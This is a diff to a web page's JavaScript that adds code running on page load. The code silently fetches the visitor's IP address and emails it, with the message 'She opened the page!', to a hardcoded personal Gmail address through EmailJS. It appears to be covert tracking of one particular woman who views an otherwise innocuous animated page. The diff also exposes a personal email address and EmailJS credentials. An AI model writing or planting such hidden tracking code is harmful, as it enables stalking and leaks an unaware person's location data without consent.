@@ -174,23 +174,27 @@ function animateModel() {
     step();
 }
 
-fetch("https://api64.ipify.org?format=json")
-    .then(response => response.json())
-    .then(data => {
-        let templateParams = {
-            user_email: "techpc.u2005@gmail.com",
-            message: `She opened the page!  
-                      IP: ${data.ip}`
-        };
+document.addEventListener("DOMContentLoaded", function () {
+    emailjs.init("gRokCld8T-GYCzVDJ"); // Your Public Key
 
-        emailjs.send("service_sklywbd", "template_vza3zn6", templateParams)
-            .then(function(response) {
-                console.log("Email sent!", response);
-            }, function(error) {
-                console.log("Failed to send email", error);
-            });
-    })
-    .catch(error => console.log("Failed to get IP info", error));
+    fetch("https://api64.ipify.org?format=json") // Get IP Address
+        .then(response => response.json())
+        .then(data => {
+            let templateParams = {
+                user_email: "techpc.u2005@gmail.com", // Your Email
+                message: `She opened the page! IP: ${data.ip}`
+            };
+
+            emailjs.send("service_sklywbd", "template_vza3zn6", templateParams)
+                .then(function(response) {
+                    console.log("Email sent!", response);
+                }, function(error) {
+                    console.log("Failed to send email", error);
+                });
+        })
+        .catch(error => console.log("Failed to get IP info", error));
+});
+
 
 
 
